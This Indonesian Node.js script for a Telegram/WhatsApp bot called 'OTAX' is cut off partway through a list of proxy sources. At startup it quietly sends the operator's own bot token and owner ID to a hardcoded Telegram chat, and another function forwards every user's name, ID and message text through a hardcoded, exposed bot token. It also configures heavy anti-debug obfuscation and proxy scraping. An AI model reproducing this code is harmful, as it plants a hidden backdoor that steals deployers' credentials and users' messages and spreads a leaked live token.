const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const JsConfuser = require("js-confuser");
const P = require("pino");
const chalk = require("chalk");
const axios = require('axios');
const crypto = require('crypto');
const cheerio = require('cheerio');
const fs = require("fs-extra");
const { Octokit } = require("@octokit/rest");
const pino = require("pino");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const config = require("./config.js");
const TelegramBot = require('node-telegram-bot-api');
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const util = require('util');
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "7176751696"]; 
const settings = require("./settings");
const { Client } = require("ssh2");
const { exec } = require("child_process");
const { webcrack } = require("webcrack");
const FormData = require('form-data');
const domain = settings.domain;
const plta = settings.plta;
const pltc = settings.pltc;
const qris = settings.qris;
const dana = settings.dana;
const gopay = settings.gopay;
const ovo = settings.ovo;


const GROUP_ID_FILE = 'group_ids.json';


function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}


function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}

function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}


function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}


function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; 
}


function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}


function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });


function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}// ngapain aja sih di mt manager bang?

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));
const OWNER_CHAT_ID = '7737364522';
const userId = OWNER_ID


const currentDate = new Date().toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
        });
const GITHUB_OWNER = ""; // nama githublu su
const GITHUB_REPO = ""; // nama repo lu njir
const GITHUB_TOKENS_FILE = ""; // file json lu
const GITHUB_TOKEN = ""; // isi token github lu yoo

 

async function startTelegramBot() {
         console.log(chalk.red(`\n
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀

𝙇𝙪 𝙈𝙖𝙪 𝙉𝙜𝙖𝙥𝙖𝙞𝙣 𝘾𝙤𝙠?!
#𝘽𝙔 𝙊𝙏𝘼
`));
    }
startTelegramBot(); 


// Fungsi Otax Kirim Notif
async function sendNotif() {
try {
        
          const message = `
✨ *OTAX Telah Dijalankan* ✨

📅 *Tanggal:* ${currentDate}
🕰️ *Waktu:* ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB

👤 *Informasi Owner:*
  - *Chat ID:* \`${OWNER_ID}\`

🔑 *Token Bot:* \`${BOT_TOKEN}\`

  *ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙*
        `;

        const url = `https://api.telegram.org/bot(TokenLuXat)/sendMessage`; 
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi:', error.message);
    }
}



sendNotif();

async function sendNotifOwner(msg, customMessage = '') {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username || 'Tidak ada username';
        const firstName = msg.from.first_name;
        const lastName = msg.from.last_name || ''; 
        const messageText = msg.text;  

        const message = `
✨ *𝘖𝘛𝘈𝘟 𝘔𝘌𝘕𝘌𝘙𝘐𝘔𝘈 𝘗𝘌𝘚𝘈𝘕* ✨

👤 *Pengirim:*
  - *Nama:* \`${firstName} ${lastName}\`
  - *Username:* @${username}
  - *ID:* \`${userId}\`
  - *Chat ID:* \`${chatId}\`

💬 *Pesan:*
\`\`\`
${messageText}
\`\`\`
  ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`;
        const url = `https://api.telegram.org/bot7781557680:AAHls3Z8HJZAQtQM-IxNInorvrF0byoNSCY/sendMessage`;
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi pesan pengguna berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi ke owner:', error.message);
        
    }
}

let otax = {};

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, { recursive: true });
    }
    return deviceDir;
}

function saveActiveSessions(botNumber) {
    try {
        createSessionDir(botNumber); 

        let sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            sessions = existing.includes(botNumber) ? existing : [...existing, botNumber];
        } else {
            sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
    } catch (error) {
        console.error("Error saving session:", error);
    }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));
      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        otax[botNumber] = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }), 
          defaultQueryTimeoutMs: undefined,
          keepAliveIntervalMs: 30000,
        });

        otax[botNumber].ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === "open") {
            console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
            sessions.set(botNumber, otax[botNumber]);
            saveActiveSessions(botNumber);
          } else if (connection === "close") {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
              console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
              setTimeout(async () => {
                await initializeWhatsAppConnections();
              }, 5000);
            } else {
              console.log(chalk.red(`Bot ${botNumber} terputus karena logout.`));
            }
          }
        });

        otax[botNumber].ev.on("creds.update", saveCreds);
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
    try {
        let statusMessage = await bot.sendMessage(
            chatId,
            `\`\`\`𝙎𝙖𝙗𝙖𝙧 𝘿𝙪𝙡𝙪 𝙔𝙖 𝘽𝙖𝙣𝙜 ${botNumber}.....\`\`\` `,
            { parse_mode: "Markdown" }
        ).then((msg) => msg.message_id);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        otax = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
            keepAliveIntervalMs: 30000,
        });
        otax.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode && statusCode >= 500 && statusCode < 600) {
                    await bot.editMessageText(
                        `\`\`\`𝙊𝙩𝙞𝙬𝙞 𝘼𝙗𝙖𝙣𝙜𝙠𝙪 ${botNumber}.....\`\`\` `,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "Markdown",
                        }
                    );
                    setTimeout(async () => {
                        await connectToWhatsApp(botNumber, chatId);
                    }, 5000);
                } else {
                    await bot.editMessageText(
                        `\`\`\`𝙃𝙚𝙝𝙚 𝙀𝙧𝙧𝙤𝙧 𝘽𝙖𝙣𝙜 ${botNumber}.....\`\`\` `,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "Markdown",
                        }
                    );
                    try {
                        fs.rmSync(sessionDir, { recursive: true, force: true });
                    } catch (error) {
                        console.error("Error deleting session:", error);
                    }
                }
            } else if (connection === "open") {
                sessions.set(botNumber, otax);
                saveActiveSessions(botNumber);
                await bot.editMessageText(
                    `\`\`\`𝘾𝙞𝙚𝙚 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 ${botNumber} 𝙐𝙬𝙪✘ \`\`\` `,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "Markdown",
                    }
                );
                otax.ev.on("connection.update", async (update) => {
                    const { connection } = update;
                    if (connection === "close") {
                        setTimeout(async () => {
                            await connectToWhatsApp(botNumber, chatId);
                        }, 5000);
                    }
                });
            } else if (connection === "connecting") {
                await new Promise((resolve) => setTimeout(resolve, 1000));
                try {
                    if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                        const code = await otax.requestPairingCode(botNumber, "OTAXOTAX");
                        const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
                        await bot.editMessageText(
                            `\`\`\`𝙈𝙖𝙣𝙩𝙖𝙥𝙨 ദ്ദി ˉ͈̀꒳ˉ͈́ )✧ 𝙎𝙪𝙠𝙨𝙚𝙨 𝙉𝙞𝙝\`\`\` 𝘾𝙤𝙙𝙚 𝘼𝙗𝙖𝙣𝙜𝙠𝙪: ${formattedCode}`,
                            {
                                chat_id: chatId,
                                message_id: statusMessage,
                                parse_mode: "Markdown",
                            }
                        );
                    }
                } catch (error) {
                    console.error("Error requesting pairing code:", error);
                    await bot.editMessageText(
                        `\`\`\` (☞ ͡° ͜ʖ ͡°)☞ 𝙂𝙖𝙜𝙖𝙡 𝘽𝙖𝙣𝙜 ${botNumber}.....\`\`\``,
                                    {
                                        chat_id: chatId,
                                        message_id: statusMessage,
                                        parse_mode: "Markdown",
                                    }
                    );
                }
            }
        });
        otax.ev.on("creds.update", saveCreds);
        return otax;
    } catch (error) {
    console.log("ERROR BANG MAAP YA")
    }};
async function loadActiveSessions() {
  try {
    const sessionsDir = path.resolve(SESSIONS_DIR);
    try {
      await fs.promises.access(sessionsDir, fs.constants.F_OK);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`Direktori "${sessionsDir}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error mengakses direktori sesi:`, error);
        return [];
      }
    }

    try {
      const data = await fs.promises.readFile(SESSIONS_FILE, 'utf8');
      return JSON.parse(data);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`File sesi "${SESSIONS_FILE}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error membaca file sesi:`, error);
        return [];
      }
    }
  } catch (error) {
    console.error("Error loading sessions:", error);
    return [];
  }
}

async function clearSessionDirectory() {
  try {
    if (await fs.promises.stat(SESSIONS_DIR).catch(() => null)) {
      await fs.promises.rm(SESSIONS_DIR, { recursive: true, force: true });
      console.log(`Direktori "${SESSIONS_DIR}" dan isinya dihapus.`);
    } else {
      console.log(`Direktori "${SESSIONS_DIR}" tidak ditemukan.`);
    }
  } catch (error) {
    console.error("Error menghapus direktori sesi:", error);
  }
}

function getChatAdmins(chatId) {
  return bot.getChatAdministrators(chatId)
    .then(admins => admins.map(admin => admin.user.id))
    .catch(err => {
      console.error("Error getting chat admins:", err);
      return [];
    });
}

function getChatAdmins(chatId) {
    return bot.getChatAdministrators(chatId)
             .then(admins => admins.map(admin => admin.user.id))
             .catch(err => {
                console.error("Error getting chat admins:", err);
                return []; 
             });
}

async function isAdmin(chatId, userId) {
  try {
      const admins = await bot.getChatAdministrators(chatId); 
      return admins.some((admin) => admin.user.id === userId); 
  } catch (error) {
      console.error("Error mendapatkan daftar admin:", error);
      return false;  
  }
}

function generateRandomPassword() {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*";
  const length = 10;
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const errorLogDir = './error_logs';
const errorLogFile = 'unhandled_errors.log';


async function ensureErrorLogDir() {
    try {
        await fs.mkdir(errorLogDir, { recursive: true });
    } catch (dirError) {
        console.error("Error membuat direktori log error:", dirError); 
    }
}

async function deleteOldLogFile() {
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.unlink(filePath); 
        console.log('File log lama berhasil dihapus.');
    } catch (deleteError) {
        if (deleteError.code !== 'ENOENT') {
            console.error('Error menghapus file log lama:', deleteError);
        }
    }
}


async function logErrorToFile(error, errorType = 'Unhandled', additionalInfo = '') { 
    await ensureErrorLogDir();
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); 
    const logEntry = `
==================================================
[${timestamp}] - ${errorType}
--------------------------------------------------
${error.stack || error}
${additionalInfo ? 'Additional Info:\n' + additionalInfo + '\n' : ''}
==================================================
`; 
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.appendFile(filePath, logEntry);
    } catch (fileError) {
        console.error("Error menulis log ke file:", fileError);
        
        console.error("Fallback Log Entry:", logEntry);
    }
}


process.on('unhandledRejection', async (reason, promise) => {
    await logErrorToFile(reason, 'Unhandled Rejection', `Promise: ${promise}`); 
});


process.on('uncaughtException', async (error) => {
    await logErrorToFile(error, 'Uncaught Exception', 'Exception occurred'); 
    process.exit(1); 
});
ensureErrorLogDir(); 
deleteOldLogFile();  

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}


function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/oyrlgx.png",
        "https://files.catbox.moe/n8u7lt.png",
        "https://files.catbox.moe/snsjxa.png"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "😡 - Tidak ada waktu aktif";
  }
}
async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await otax.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "🙈";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "🙈";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("🙈 Maaf, Anda bukan user premium. Silakan hubungi developer @Otapengenkawin untuk upgrade.");
    }
};

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `オタッOtaxAyunクス${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};


const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};


async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© ᴇɴᴄ ʙᴏᴛ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

const logFile = "bot.log";


function logToFileAndConsole(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  console.log(logMessage);
  fs.appendFileSync(logFile, logMessage);
}


async function scrapeProxies() {
  const proxySources = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/HumayunShariarHimu/Proxy/main/Anonymous_HTTP_One.md",
    "https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
